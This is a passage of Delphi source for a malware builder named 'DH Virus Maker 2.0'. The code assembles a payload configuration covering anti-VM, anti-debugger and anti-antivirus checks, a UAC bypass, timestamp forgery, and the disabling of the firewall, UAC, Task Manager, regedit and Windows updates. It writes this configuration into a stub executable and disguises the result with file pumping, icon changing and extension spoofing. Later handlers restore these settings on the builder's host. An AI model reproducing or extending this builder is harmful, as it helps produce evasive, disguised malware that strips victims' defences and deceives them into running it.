  extraction_config := '[op_use_special_path]' + op_use_special_path +
    '[op_use_special_path]' + '[op_use_this_path]' + op_i_use_this +
    '[op_use_this_path]' + '[special_path]' + cmbSpecialPaths.text +
    '[special_path]' + '[path]' + txtPath.text + '[path]' + '[folder]' +
    txtFolder.text + '[folder]' + '[op_use_uac_tricky]' + op_use_uac_tricky +
    '[op_use_uac_tricky][op_uac_tricky_continue_if_off]' +
    op_uac_tricky_continue_if_off + '[op_uac_tricky_continue_if_off]' +
    '[op_uac_tricky_exit_if_off]' + op_uac_tricky_exit_if_off +
    '[op_uac_tricky_exit_if_off][op_use_this_datetime]' + op_use_this_datetime +
    '[op_use_this_datetime][creation_time]' + txtCreationTime.text +
    '[creation_time][modified_time]' + txtModifiedTime.text +
    '[modified_time][last_access]' + txtLastAccessTime.text + '[last_access]';

  antis_config := '[op_anti_virtual_pc]' + op_anti_virtual_pc +
    '[op_anti_virtual_pc]' + '[op_anti_virtual_box]' + op_anti_virtual_box +
    '[op_anti_virtual_box]' + '[op_anti_debug]' + op_anti_debug +
    '[op_anti_debug]' + '[op_anti_wireshark]' + op_anti_wireshark +
    '[op_anti_wireshark]' + '[op_anti_ollydbg]' + op_anti_ollydbg +
    '[op_anti_ollydbg]' + '[op_anti_anubis]' + op_anti_anubis +
    '[op_anti_anubis]' + '[op_anti_kaspersky]' + op_anti_kaspersky +
    '[op_anti_kaspersky]' + '[op_anti_vmware]' + op_anti_vmware +
    '[op_anti_vmware]';

  disables_config := '[op_disable_uac]' + op_disable_uac + '[op_disable_uac]' +
    '[op_disable_firewall]' + op_disable_firewall + '[op_disable_firewall]' +
    '[op_disable_cmd]' + op_disable_cmd + '[op_disable_cmd]' +
    '[op_disable_run]' + op_disable_run + '[op_disable_run]' +
    '[op_disable_taskmgr]' + op_disable_taskmgr + '[op_disable_taskmgr]' +
    '[op_disable_regedit]' + op_disable_regedit + '[op_disable_regedit]' +
    '[op_disable_updates]' + op_disable_updates + '[op_disable_updates]' +
    '[op_disable_msconfig]' + op_disable_msconfig + '[op_disable_msconfig]';

  linea_final := configuration + extraction_config + antis_config +
    disables_config;

  DeleteFile(stub_generado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'stub.exe'),
    PChar(stub_generado), True);

  builder_tools := T_DH_Builder_Tools.Create();
  server_manager := T_DH_Server_Manager.Create();

  if (builder_tools.write_resource(stub_generado, linea_final, 666)) then
  begin

    if (cbIUseFilePumper.Checked) then
    begin
      if (server_manager.file_pumper(stub_generado, txtCount.text,
        cmbTypes.text)) then
      begin
        status.Panels[0].text := '[+] File Pumper';
        status.Update;
      end
      else
      begin
        status.Panels[0].text := '[-] Error with File Pumper';
        status.Update;
      end;
    end;

    if (cbUseIconChanger.Checked) then
    begin
      if (server_manager.change_icon(stub_generado, txtPathIcon.text)) then
      begin
        status.Panels[0].text := '[+] Icon Changed';
        status.Update;
      end
      else
      begin
        status.Panels[0].text := '[-] Error with Icon Changer';
        status.Update;
      end;
    end;

    if (cbUseExtensionSpoofer.Checked) then
    begin
      if (rbUseSelectExtension.Checked) then
      begin
        if (server_manager.extension_changer(stub_generado, cmbExtensions.text))
        then
        begin
          status.Panels[0].text := '[+] Extension Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with Extension Changer';
          status.Update;
        end;
      end;
      if (rbUseThisExtension.Checked) then
      begin
        if (server_manager.extension_changer(stub_generado, txtExtension.text))
        then
        begin
          status.Panels[0].text := '[+] Extension Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with Extension Changer';
          status.Update;
        end;
      end;
    end;

    status.Panels[0].text := '[+] Done';
    status.Update;

    message_box('DH Virus Maker 2.0', 'Stub Generated', 'Information');

  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error generating stub', 'Error');
  end;

  builder_tools.Free;
  server_manager.Free;

  //

end;

procedure TFormHome.btnLoadIconClick(Sender: TObject);
var
  icon_loaded: string;
begin
  icon_loaded := open_dialog('Select Icon', 'Icon file|*.ico', 0);
  if not(icon_loaded = '') then
  begin
    txtPathIcon.text := icon_loaded;
    imgPreviewIcon.Picture.LoadFromFile(icon_loaded);
    message_box('DH Virus Maker 2.0', 'Icon loaded', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Icon not found', 'Warning');
  end;
end;

procedure TFormHome.btnActiveCMDClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.cmd_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'CMD Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveFirewallClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.firewall_manager('seven', 'on')) then
  begin
    message_box('DH Virus Maker 2.0', 'Firewall Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveRegeditClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.regedit_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'Regedit Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveRunClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.run_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'Run Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveTaskmgrClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.taskmgr_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'Taskmgr Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveUACClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.uac_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'UAC Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnActiveUpdatesClick(Sender: TObject);
var
  disable: T_DH_Malware_Disables;
begin
  disable := T_DH_Malware_Disables.Create();
  if (disable.updates_manager('on')) then
  begin
    message_box('DH Virus Maker 2.0', 'Updates Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  disable.Free();
end;

procedure TFormHome.btnRestoreScreensaverClick(Sender: TObject);
var
  malware: T_DH_Malware_Functions;
begin
  malware := T_DH_Malware_Functions.Create();
  if (Pos('OK', malware.unlock_sreensaver()) > 0) then
  begin
    message_box('DH Virus Maker 2.0', 'Screensaver Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  malware.Free();
end;

procedure TFormHome.btnRestoreTaskbarTextClick(Sender: TObject);
var
  malware: T_DH_Malware_Functions;
begin
  malware := T_DH_Malware_Functions.Create();
  if (Pos('OK', malware.edit_taskbar_text('off', 'hi')) > 0) then
  begin
    message_box('DH Virus Maker 2.0', 'Restore Taskbar Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  malware.Free();
end;

procedure TFormHome.btnRestoreWallpaperClick(Sender: TObject);
var
  malware: T_DH_Malware_Functions;
begin
  malware := T_DH_Malware_Functions.Create();
  if (Pos('OK', malware.unlock_wallpaper()) > 0) then
  begin
    message_box('DH Virus Maker 2.0', 'Wallpaper Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  malware.Free();
end;

procedure TFormHome.btnShowIconsClick(Sender: TObject);
var
  malware: T_DH_Malware_Functions;
begin
  malware := T_DH_Malware_Functions.Create();
  if (Pos('OK', malware.icons_manager('show')) > 0) then
  begin
    message_box('DH Virus Maker 2.0', 'Icons Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  malware.Free();
end;

procedure TFormHome.btnShowTaskbarClick(Sender: TObject);
var
  malware: T_DH_Malware_Functions;
begin
  malware := T_DH_Malware_Functions.Create();
  if (Pos('OK', malware.taskbar_manager('show')) > 0) then
  begin
    message_box('DH Virus Maker 2.0', 'Taskbar Enabled', 'Information');
  end
  else
  begin
    message_box('DH Virus Maker 2.0', 'Error', 'Error');
  end;
  malware.Free();
end;

end.

// The End ?
